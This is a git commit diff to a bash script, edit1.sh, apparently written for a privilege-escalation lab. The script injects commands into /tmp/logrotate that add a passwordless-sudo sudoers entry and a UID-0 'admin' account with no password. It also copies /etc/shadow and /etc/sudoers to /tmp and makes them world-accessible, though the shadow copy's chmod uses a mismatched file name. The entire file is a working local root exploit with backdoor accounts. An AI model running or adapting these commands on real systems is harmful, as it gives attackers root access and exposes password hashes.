737bb15a451a5d096103f41e3b323bce25c0dc0b
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-17 20:02:57 +0200

    Update edit1.sh

--- edit1.sh
+++ edit1.sh
@@ -1,3 +1,7 @@
 #!/bin/bash
-echo "echo 'vickie ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
-echo "echo 'vickie::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
+cp /etc/shadow /tmp/sha_copy
+chmod 666 /tmp/sh_copy 
+cp /etc/sudoers /tmp/sudoers_copy
+chmod 666 /tmp/sudoers_copy 
+echo "echo 'pzpo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /tmp/logrotate
+echo "echo 'admin::0:0:System Administrator:/root/root:/bin/bash' >> /etc/passwd"  >> /tmp/logrotate
